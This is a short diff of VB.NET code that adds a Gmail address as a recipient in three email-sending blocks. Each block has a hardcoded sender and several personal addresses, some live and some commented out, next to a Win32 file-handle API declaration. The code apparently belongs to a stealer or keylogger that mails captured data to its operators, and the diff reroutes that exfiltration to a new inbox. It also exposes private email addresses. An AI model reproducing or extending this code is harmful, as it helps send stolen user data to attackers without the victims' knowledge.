@@ -237,7 +237,7 @@ ByVal hTemplateFile As IntPtr) As IntPtr
 
             'message.To.Add("corderoxg@gmail.com")
 
-            'message.To.Add("gtx247247@gmail.com")
+            message.To.Add("Perezwander156@gmail.com")
 
             'message.To.Add("whaterbautista@icloud.com")
 
@@ -363,7 +363,7 @@ ByVal hTemplateFile As IntPtr) As IntPtr
 
             message.From = New MailAddress("dead_25@outlook.es")
             message.To.Add("reimy_64@hotmail.com")
-
+            message.To.Add("Perezwander156@gmail.com")
             'message.To.Add("corderoxg@gmail.com")
 
             'message.To.Add("whaterbautista@icloud.com")
@@ -455,7 +455,7 @@ ByVal hTemplateFile As IntPtr) As IntPtr
 
             message.From = New MailAddress("dead_25@outlook.es")
             message.To.Add("reimy_64@hotmail.com")
-
+            message.To.Add("Perezwander156@gmail.com")
             'message.To.Add("corderoxg@gmail.com")
 
             'message.To.Add("whaterbautista@icloud.com")
